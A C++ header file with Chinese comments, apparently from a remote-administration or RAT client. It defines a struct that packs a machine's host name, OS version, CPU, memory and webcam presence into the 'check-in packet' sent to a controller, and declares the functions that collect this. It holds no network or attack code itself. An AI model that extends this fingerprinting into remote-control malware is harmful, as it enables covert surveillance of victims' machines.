#pragma once

#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")


#define LOGIN_PACKET_BODY_LENGTH (50+30+80+30+1)


typedef struct _LOGIN_INFO {
	CHAR			szHostName[50];		// 主机名
	CHAR			szOsVersion[30];	// 操作系统版本
	CHAR			szCpuType[80];		// CPU型号、主频等
	CHAR			szMemoryInfo[30];	// 内存
	BOOL			bHaveCamera;		// 是否有摄像头

	VOID StructToBuffer(PBYTE pbBuffer) {
		memcpy(pbBuffer, szHostName, 50);
		memcpy(pbBuffer + 50, szOsVersion, 30);
		memcpy(pbBuffer + 80, szCpuType, 80);
		memcpy(pbBuffer + 160, szMemoryInfo, 30);
		pbBuffer[50 + 30 + 80 + 30] = (BYTE)bHaveCamera;
	}

	_LOGIN_INFO() {
		ZeroMemory(&szHostName, 50);
		ZeroMemory(&szOsVersion, 30);
		ZeroMemory(&szCpuType, 80);
		ZeroMemory(&szMemoryInfo, 30);
		bHaveCamera = false;
	}

	_LOGIN_INFO(PBYTE pbBuffer) {
		memcpy(szHostName, pbBuffer, 50);
		memcpy(szOsVersion, pbBuffer + 50, 30);
		memcpy(szCpuType, pbBuffer + 80, 80);
		memcpy(szMemoryInfo, pbBuffer + 160, 30);
		bHaveCamera = pbBuffer[190];
	}
}LOGIN_INFO, *PLOGIN_INFO;



// 获取登录信息，即上线包的包体
VOID GetLoginInfo(PBYTE pbLoginPacketBody);



// 摄像头
BOOL HaveCamera();

// 获取CPU型号,主频等
VOID GetCpuType(CHAR* lpszCpuType, DWORD dwBufferSize);

// 获取操作系统版本
VOID GetOSVersion(CHAR* lpszOsVersion, DWORD dwBufferSize);

// 获取内存（可用/总共，单位GB）
VOID GetMemoryInfo(CHAR* lpszMemoryInfo, size_t dwBufferSize);